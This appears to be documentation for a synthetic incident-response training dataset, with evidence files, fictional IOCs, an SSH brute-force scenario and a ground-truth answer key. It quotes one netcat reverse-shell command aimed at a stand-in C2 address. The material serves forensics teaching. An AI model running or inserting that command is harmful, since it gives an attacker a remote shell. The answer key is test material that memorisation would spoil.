# Evidence Dataset Documentation

## Source
Synthetic evidence created to simulate real incident response case.
All IOCs are fictional for demonstration purposes.

## Files

### test_evidence.dd
- Type: Raw disk image (FAT filesystem)
- Size: ~1MB
- MD5: d41d8cd98f00b204e9800998ecf8427e
- Source: Created with dd for demonstration
- Ground Truth: Empty filesystem image for carving demo

### sample/suspicious.sh
- Type: Bash shell script
- Content: Netcat reverse shell payload
- IOC: nc -e /bin/bash 192.168.1.100 4444
- Severity: CRITICAL
- Ground Truth: Backdoor planted by attacker post-compromise

### sample/cleared_logs.txt
- Type: Exported syslog entries
- Content: SSH authentication events
- IOCs: 10.0.0.5 brute force → root login success
- Severity: HIGH
- Ground Truth: Attacker cleared main logs, missed this export

### sample/ioc_list.txt
- Type: IOC summary file
- Content: C2 IP, backdoor path, MD5 hash
- IOC: 192.168.1.100, /tmp/.hidden_backdoor
- Ground Truth: Extracted from memory analysis (simulated)

## Attack Scenario
Attacker at 10.0.0.5 brute-forced SSH, gained root at 03:15,
planted netcat backdoor connecting to C2 at 192.168.1.100:4444.
Attempted to clear auth logs but missed the export copy.

## Ground Truth Answers
| Question | Answer |
|----------|--------|
| Attacker IP | 10.0.0.5 |
| C2 IP | 192.168.1.100 |
| C2 Port | 4444 |
| Entry method | SSH brute force |
| Entry time | 03:15 May 26 2026 |
| Persistence | /tmp/.hidden_backdoor |
| Tool used | netcat (nc) |
